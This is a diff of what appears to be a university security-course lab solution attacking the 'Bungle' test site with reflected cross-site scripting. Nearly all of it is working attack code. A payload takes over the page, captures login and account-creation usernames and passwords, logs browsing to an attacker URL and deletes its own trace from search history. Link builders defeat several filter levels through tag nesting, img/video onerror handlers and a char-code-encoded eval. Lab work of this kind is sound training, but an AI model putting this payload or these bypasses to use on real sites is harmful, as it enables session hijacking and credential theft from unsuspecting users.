@@ -3,33 +3,260 @@
 <script>
 // Extend this function:
 function payload(attacker) {
+    var currentTitle;
+    var currentPage;
+
+    var currentUser = "";
+
     function log(data) {
-        console.log($.param(data))
+        console.log($.param(data));
         $.get(attacker, data);
     }
+
+    function updateCurrentPage(newHtml, newTitle, newPage) {
+        $("body").html(newHtml);
+        currentTitle = newTitle;
+        currentPage = newPage;
+        var stateDict = {
+            "html": $("body").html(),
+            "title": currentTitle,
+            "page": currentPage
+        };
+        window.history.replaceState(stateDict, currentTitle, currentPage);
+        $("title")[0].text = currentTitle;
+
+        injectIntoPage();
+        logPage();
+    }
+
+    function updateHistory() {
+        var stateDict = {
+            "html": $("body").html(),
+            "title": currentTitle,
+            "page": currentPage
+        }
+        window.history.pushState(stateDict, currentTitle, currentPage);
+    }
+
+    function injectIntoPage() {
+        /** login form **/
+        var loginButton = $("#log-in-btn");
+        var createAccountButton = $("#new-account-btn");
+
+        var usernameField = $("#username")[0];
+        var userpassField = $("#userpass")[0];
+
+        $(".form-inline").attr("onsubmit", "return false");
+
+        /* login button */
+        if (loginButton) {
+            loginButton.click(function() {
+                if (usernameField.value && usernameField.value) {
+                    console.log("attempt login");
+
+                    $.post(
+                        "./login",
+                        {
+                            username: usernameField.value,
+                            password: userpassField.value
+                        }
+                    )
+                    .done(function(data) {
+                        currentUser = usernameField.value
+                        log({event: "login", user: currentUser, pass: userpassField.value});
+                        updateHistory();
+                        updateCurrentPage(data, "Bungle!", "./");
+                        return false;
+                    })
+                    .fail(function (jqXHR, textStatus, error) {
+                        updateHistory();
+                        textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
+                        var newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                        updateCurrentPage(jqXHR.responseText, newTitle, "./login");
+                        return false;
+                    });
+                }
+            });
+        }
+
+        /* create account button */
+        if (createAccountButton) {
+            createAccountButton.click(function() {
+                if (usernameField.value && usernameField.value) {
+                    console.log("create login");
+
+                    $.post(
+                        "./create",
+                        {
+                            username: usernameField.value,
+                            password: userpassField.value
+                        }
+                    )
+                    .done(function(data) {
+                        currentUser = usernameField.value
+                        log({event: "login", user: currentUser, pass: userpassField.value});
+                        updateHistory();
+                        updateCurrentPage(data, "Bungle!", "./");
+                        return false;
+                    })
+                    .fail(function (jqXHR, textStatus, error) {
+                        updateHistory();
+                        textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
+                        var newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                        updateCurrentPage(jqXHR.responseText, newTitle, "./create");
+                        return false;
+                    });
+                }
+            });
+        }
+
+        /* logout button */
+        var logoutButton = $("#log-out-btn");
+        if (logoutButton) {
+            logoutButton.click(function() {
+                $.post("./logout")
+                .done(function(data) {
+                    log({event: "logout", user: currentUser});
+                    currentUser = ""
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                })
+                .fail(function (jqXHR, textStatus, error) {
+                    updateHistory();
+                    var newTitle = textStatus + ": " + jqXHR.status + " " + error;
+                    updateCurrentPage(jqXHR.responseText, newTitle, "./logout");
+                    return false;
+                });
+            });
+            logoutButton.attr("onsubmit", "return false");
+        }
+
+        /* bungle button */
+        var bungleLink = $("#bungle-lnk");
+        if (bungleLink) {
+            bungleLink.removeAttr("href");
+            bungleLink.click(function() {
+                $.get("./")
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                });
+            });
+        }
+
+        /* search button */
+        var searchButton = $("#search-btn");
+        var queryField = $("#query")[0];
+        if (searchButton) {
+            searchButton.click(function() {
+                var urlS = "./search?q=" + queryField.value;
+                $.get(urlS)
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Search Results", urlS);
+                    return false;
+                });
+            });
+            searchButton.attr("onsubmit", "return false");
+        }
+
+        /* search again button */
+        var searchAgainButton = $("#search-again-btn");
+        if (searchAgainButton) {
+            searchAgainButton.removeAttr("href");
+            searchAgainButton.click(function() {
+                $.get("./")
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Bungle!", "./");
+                    return false;
+                });
+            });
+        }
+
+        /* search history */
+        $(".history-item").removeAttr("href");
+        $.each($(".history-item"), function() {
+            $(this).click(function() {
+                var urlS = "./search?q=" + this.text;
+                $.get(urlS)
+                .done(function(data) {
+                    updateHistory();
+                    updateCurrentPage(data, "Search Results", urlS);
+                    return false;
+                });
+            });
+            console.log(this.text);
+            if (this.text.includes("payload(attacker)")) {
+                this.remove();
+            }
+        });
+    }
+
+    function logPage() {
+        var path = window.location.href;
+        log({event: "nav", user: currentUser, url: path});
+    }
+
     function proxy(href) {
-        $("html").load(href, function(){
-            $("html").show();
-            log({event: "nav", url: href});
-            $("#query").val("pwned!");
-}); }
-    $("html").hide();
+        $("body").load(href, function() {
+            $("body").attr("style", "background-color:powderblue;");
+            updateCurrentPage($("body").html(), "Bungle!", "./");
+
+            window.onpopstate = function(event) {
+                var html = event.state["html"];
+                var title = event.state["title"];
+                var page = event.state["page"];
+                updateCurrentPage(html, title, page);
+            };
+        });
+    }
+    $("body").empty();
     proxy("./");
 }
+
 function makeLink(xssdefense, target, attacker) {
-    if (xssdefense == 0) {
+    var payloadString = payload.toString()
+    payloadString = payloadString.replace(/^\s+/mg, "");
+
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + payloadString +
+            ";payload(\"" + attacker + "\");<\/script" + ">");
+    } else if (xssdefense == 1) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-            encodeURIComponent("<script" + ">" + payload.toString() +
-            ";payload(\"" + attacker + "\");</script" + ">");
-    } else {
-        // Implement code to defeat XSS defenses here.
-} }
-var xssdefense = 0;
-var target = "http://bungle-cs461.cs.illinois.edu/";
+            encodeURIComponent("<scrscriptipt" + ">" + payloadString +
+            ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+    } else if (xssdefense == 2) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<img src=kms onerror=\'" + payloadString
+            + "payload(\"" + attacker + "\");\'>");
+    } else if (xssdefense == 3){
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<video src=kms onerror=\'" + payloadString
+            + ";payload(\"" + attacker + "\");\'>");
+    } else if (xssdefense == 4) {
+        var payloadMin = "function payload(t){var e,n,o,r=\"\";function a(e){console.log($.param(e)),$.get(t,e)}function l(t,o,s){$(\"body\").html(t),e=o,n=s;var i,c={html:$(\"body\").html(),title:e,page:n};window.history.replaceState(c,e,n),$(\"title\")[0].text=e,function(){var t=$(\"#log-in-btn\"),e=$(\"#new-account-btn\"),n=$(\"#username\")[0],o=$(\"#userpass\")[0];$(\".form-inline\").attr(\"onsubmit\",\"return false\"),t&&t.click(function(){n.value&&n.value&&(console.log(\"attempt login\"),$.post(\"./login\",{username:n.value,password:o.value}).done(function(t){return a({event:\"login\",user:r=n.value,pass:o.value}),u(),l(t,\"Bungle!\",\"./\"),!1}).fail(function(t,e,n){u();var o=(e=e.charAt(0).toUpperCase()+e.slice(1))+\": \"+t.status+\" \"+n;return l(t.responseText,o,\"./login\"),!1}))});e&&e.click(function(){n.value&&n.value&&(console.log(\"create login\"),$.post(\"./create\",{username:n.value,password:o.value}).done(function(t){return a({event:\"login\",user:r=n.value,pass:o.value}),u(),l(t,\"Bungle!\",\"./\"),!1}).fail(function(t,e,n){u();var o=(e=e.charAt(0).toUpperCase()+e.slice(1))+\": \"+t.status+\" \"+n;return l(t.responseText,o,\"./create\"),!1}))});var s=$(\"#log-out-btn\");s&&(s.click(function(){$.post(\"./logout\").done(function(t){return a({event:\"logout\",user:r}),r=\"\",u(),l(t,\"Bungle!\",\"./\"),!1}).fail(function(t,e,n){u();var o=e+\": \"+t.status+\" \"+n;return l(t.responseText,o,\"./logout\"),!1})}),s.attr(\"onsubmit\",\"return false\"));var i=$(\"#bungle-lnk\");i&&(i.removeAttr(\"href\"),i.click(function(){$.get(\"./\").done(function(t){return u(),l(t,\"Bungle!\",\"./\"),!1})}));var c=$(\"#search-btn\"),f=$(\"#query\")[0];c&&(c.click(function(){var t=\"./search?q=\"+f.value;$.get(t).done(function(e){return u(),l(e,\"Search Results\",t),!1})}),c.attr(\"onsubmit\",\"return false\"));var v=$(\"#search-again-btn\");v&&(v.removeAttr(\"href\"),v.click(function(){$.get(\"./\").done(function(t){return u(),l(t,\"Bungle!\",\"./\"),!1})}));$(\".history-item\").removeAttr(\"href\"),$.each($(\".history-item\"),function(){console.log(\"helasd1\"),$(this).click(function(){console.log(\"helasd\");var t=\"./search?q=\"+this.text;$.get(t).done(function(e){return u(),l(e,\"Search Results\",t),!1})}),console.log(this.text),this.text.includes(\"payload(attacker)\")&&this.remove()})}(),i=window.location.href,a({event:\"nav\",user:r,url:i})}function u(){var t={html:$(\"body\").html(),title:e,page:n};window.history.pushState(t,e,n)}$(\"body\").empty(),o=\"./\",$(\"body\").load(o,function(){$(\"body\").attr(\"style\",\"background-color:powderblue;\"),l($(\"body\").html(),\"Bungle!\",\"./\"),window.onpopstate=function(t){l(t.state.html,t.state.title,t.state.page)}})}payload(\"http://127.0.0.1:31337/stolen\");";
+        var payloadString = "";
+        for (var i = 0; i < payloadMin.length; ++i) {
+            if (payloadString != "") payloadString += ", ";
+            payloadString += payloadMin.charCodeAt(i);
+        }
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + "eval(String.fromCharCode(" + payloadString + "))" + "<\/script" + ">");
+    }
+}
+
+var xssdefense = 4;
+var target = "http://bungle-cs461.csl.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
+
 $(function() {
     var url = makeLink(xssdefense, target, attacker);
     $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
 });
+
 </script>
 <h3></h3>
